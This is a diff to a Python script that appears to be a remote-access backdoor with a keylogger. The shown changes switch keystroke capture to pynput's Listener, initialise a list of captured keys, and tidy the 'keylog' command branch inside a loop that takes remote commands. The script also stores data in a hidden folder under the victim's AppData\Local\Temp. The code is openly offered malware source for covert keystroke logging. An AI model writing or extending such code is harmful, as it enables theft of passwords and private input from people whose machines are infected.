@@ -7,7 +7,8 @@
 #twitter: @rossin135
 #github: https://github.com/rossiniroberto52
 import socket, os, subprocess, webbrowser, shutil
-import keyboard as key
+from pynput.keyboard import Key as key
+from pynput.keyboard import Listener
 from getpass import getuser
 from pathlib import Path
 from os import path
@@ -18,6 +19,8 @@ USER = getuser()
 
 #used PATHS:
 temp_path = r'C:\Users\%s\AppData\Local\Temp\_TMP995858_atmpk' % USER
+
+keys = []
 
 def functionPK(key):
     keys.append(key)
@@ -79,7 +82,6 @@ while True:
         # Kstay shutdown the sistem. stay dont shutdown
         #re-start the server
     if cmd == "keylog":
-            if(cmd == "keylog"):
         with Listener(on_press = functionPK) as the_listener:  
             the_listener.join()
 
